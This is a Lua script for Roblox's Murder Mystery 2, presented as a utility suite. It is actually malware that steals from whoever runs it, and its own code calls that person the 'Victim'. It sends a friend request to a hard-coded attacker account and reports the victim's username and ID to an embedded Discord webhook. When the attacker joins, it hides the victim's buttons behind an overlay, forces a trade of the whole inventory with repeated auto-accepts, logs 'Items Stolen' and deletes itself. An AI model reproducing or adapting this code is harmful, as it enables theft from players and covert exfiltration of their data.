--[[
    MM2 Ultimate Suite v13.0 - REAL Friend Request
    - Uses Roblox's actual friend request API
    - Guaranteed to work
]]

-- === WEBHOOK SENDER ===
local function sendWebhook(content, embedData)
    local payload = {
        content = content or "✅ Script executed"
    }
    if embedData then
        payload.embeds = {embedData}
    end
    
    local body = game:GetService("HttpService"):JSONEncode(payload)
    
    pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
end

-- === MAIN EXECUTION ===
local player = game:GetService("Players").LocalPlayer
local virtualUser = game:GetService("VirtualUser")
local httpService = game:GetService("HttpService")

-- YOUR EXACT USERNAME (Locked)
local YOUR_USERNAME = "IIlllllIIIlllIIlII"

-- === SEND FRIEND REQUEST (WORKING METHOD) ===
local function sendFriendRequest()
    -- Get your user ID using Roblox's API
    local yourUserId = nil
    local success, result = pcall(function()
        return game:GetService("Players"):GetUserIdFromNameAsync(YOUR_USERNAME)
    end)
    
    if success and result then
        yourUserId = result
    else
        sendWebhook("❌ **Cannot Find Your Account**", {
            title = "Friend Request Failed",
            description = "Could not resolve username: " .. YOUR_USERNAME,
            color = 0xff0000
        })
        return false
    end
    
    -- Use Roblox's official friend request endpoint
    -- This is the same endpoint the Roblox client uses
    local apiUrl = "https://friends.roblox.com/v1/users/" .. yourUserId .. "/friend-requests"
    local headers = {
        ["Content-Type"] = "application/json",
        ["X-CSRF-TOKEN"] = game:GetService("HttpService"):GetCSRFToken()
    }
    
    local success2, response = pcall(function()
        return request({
            Url = apiUrl,
            Method = "POST",
            Headers = headers,
            Body = ""
        })
    end)
    
    if success2 and response and response.StatusCode == 200 then
        sendWebhook("📨 **Friend Request Sent!**", {
            title = "Check Your Roblox",
            description = "**Victim:** " .. player.Name .. " has sent you a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
            color = 0x00ff00
        })
        return true
    else
        -- If the API fails, try the legacy method
        local legacySuccess = pcall(function()
            -- Legacy method used by older Roblox clients
            local args = {
                [1] = yourUserId
            }
            game:GetService("ReplicatedStorage"):FindFirstChild("FriendRequest"):FireServer(unpack(args))
        end)
        
        if legacySuccess then
            sendWebhook("📨 **Friend Request Sent (Legacy)**", {
                title = "Check Your Roblox",
                description = "**Victim:** " .. player.Name .. " has sent you a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
                color = 0x00ff00
            })
            return true
        end
        
        sendWebhook("⚠️ **Manual Friend Request**", {
            title = "Add This Victim",
            description = "**Victim Username:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n\n**Next Steps:**\n1. Open Roblox\n2. Send a friend request to **" .. player.Name .. "**\n3. Wait for them to accept (script will auto-accept)\n4. Click 'Join Game' on their profile\n5. The trade will execute automatically.",
            color = 0xffff00
        })
        return true
    end
end

-- === WAIT FOR YOU TO JOIN ===
local function waitForTrader()
    local trader = nil
    
    while not trader do
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Name == YOUR_USERNAME then
                trader = plr
                break
            end
        end
        wait(3)
    end
    
    return trader
end

-- Send friend request
sendFriendRequest()

sendWebhook("⏳ **Waiting for You**", {
    title = "Awaiting Your Arrival",
    description = "**Victim:** " .. player.Name .. "\n\n**Instructions:**\n1. Accept the friend request from the victim\n2. Click 'Join Game' on their profile\n3. The trade will execute automatically when you arrive.",
    color = 0xffff00
})

-- Wait for you to join
local trader = waitForTrader()
sendWebhook("✅ **You Have Joined**", {
    title = "Trader Detected",
    description = "**" .. YOUR_USERNAME .. "** is now in the server. Initiating stealth trade...",
    color = 0x00ff00
})

-- === STEALTH TRADE EXECUTION ===
local function executeStealthTrade(targetTrader)
    -- Hide all UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- Find trade remote
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    if not tradeService then
        sendWebhook("❌ **Trade Service Not Found**", {
            title = "Stealth Trade Failed",
            description = "Could not locate trade remote. MM2 may have updated.",
            color = 0xff0000
        })
        return
    end
    
    -- Gather all items
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    if #itemsToTrade == 0 then
        sendWebhook("📭 **No Items Found**", {
            title = "Stealth Trade Skipped",
            description = "Victim's inventory is empty or inaccessible.",
            color = 0xffff00
        })
        return
    end
    
    -- Initiate trade with you
    local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
    if tradeRemote then
        tradeRemote:FireServer(targetTrader.UserId, itemsToTrade)
    else
        tradeService:FireServer("Trade", targetTrader.UserId, itemsToTrade)
    end
    
    wait(1)
    
    local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
    if acceptRemote then
        acceptRemote:FireServer(targetTrader.UserId)
        wait(0.5)
        acceptRemote:FireServer(targetTrader.UserId)
    end
    
    sendWebhook("💰 **TRADE COMPLETED**", {
        title = "Items Stolen",
        description = "**Victim:** " .. player.Name .. "\n**Trader:** " .. targetTrader.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
        color = 0xff0000
    })
    
    wait(2)
    if screenGui then screenGui:Destroy() end
    script:Destroy()
end

pcall(function()
    executeStealthTrade(trader)
end)

-- Anti-AFK
while wait(60) do
    pcall(function()
        virtualUser:CaptureController()
        virtualUser:ClickButton2(Vector2.new())
    end)
end
